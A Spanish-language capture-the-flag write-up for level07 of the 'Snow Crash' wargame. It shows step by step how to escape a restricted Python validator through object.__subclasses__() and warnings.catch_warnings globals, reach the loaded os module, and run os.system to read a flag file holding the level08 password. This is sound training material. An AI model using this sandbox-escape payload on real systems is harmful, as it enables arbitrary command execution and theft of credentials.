# Level07 - Snow Crash

## Tipo de ejercicio

Escape de un sandbox Python mediante introspección de objetos y acceso a un
módulo del proceso para ejecutar comandos del sistema.

## Objetivo

Encontrar la credencial que permite conectarse al usuario `level08`.

El nivel presenta un validador Python restringido: las
entradas no se ejecutan como comandos Bash, sino como expresiones Python.

## 1. Reconocer el validador

Al entrar en `level07`, el prompt muestra:

```text
Session validator v2.1.4 — restricted access
You will never escape this
```

Los comandos normales no funcionan como shell. Por ejemplo, `hostname` se
interpreta como un nombre Python y `ls -la` produce errores de sintaxis.

La prueba siguiente sí se evalúa:

```python
().__class__
```

Resultado:

```text
<class 'tuple'>
```

Esto confirma que podemos inspeccionar objetos Python desde el validador.

## 2. Llegar hasta object

Una tupla tiene como clase base a `object`:

```python
().__class__.__base__
```

Resultado:

```text
<class 'object'>
```

Desde `object` se pueden enumerar todas las subclases cargadas por el
intérprete:

```python
().__class__.__base__.__subclasses__()
```

Entre las clases disponibles aparece:

```text
<class 'warnings.catch_warnings'>
```

## 3. Recuperar el módulo sys

La clase `warnings.catch_warnings` conserva una referencia a sus variables
globales. Podemos localizarla con una comprensión de listas:

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings']
```

Al intentar mostrar directamente sus globales, el validador bloquea nombres
como `open` y `__import__`. Sin embargo, el módulo `sys` ya está cargado y se
puede obtener desde esos globales:

```python
[c.__init__.__globals__['sys'] for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings']
```

La inspección de `sys.modules` confirma que `os` ya está cargado:

```python
[c.__init__.__globals__['sys'].modules.keys() for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings']
```

## 4. Ejecutar el comando con os.system

`os.popen()` fue bloqueado porque intenta importar internamente `subprocess`.
La función `os.system()` ya está disponible y permite ejecutar directamente
`cat` con los privilegios del proceso del validador.

El payload utilizado se encuentra en
[sandbox-escape.expr](sandbox-escape.expr):

```python
[c.__init__.__globals__['sys'].modules['os'].system('cat /home/flag07/.flag') for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings']
```

Al introducirlo en el validador, se obtuvo:

```text
fiumuikeil8rung8ahcuiperb
[0]
```

El `0` es el código de retorno de `os.system`; la credencial se imprime antes.

## 5. Conectarse a level08

Desde el equipo anfitrión:

```bash
exit
ssh level08@localhost -p 2424
```

Cuando SSH solicite la contraseña, introducir:

```text
fiumuikeil8rung8ahcuiperb
```

## Conclusión

El nivel no requiere modificar archivos de la OVA. La vulnerabilidad está en
el sandbox Python, que permite acceder a `object.__subclasses__()`, encontrar
`warnings.catch_warnings`, recuperar `sys.modules` y reutilizar el módulo `os`
ya cargado. `os.system()` ejecuta `cat /home/flag07/.flag` y revela la
credencial de `level08`.
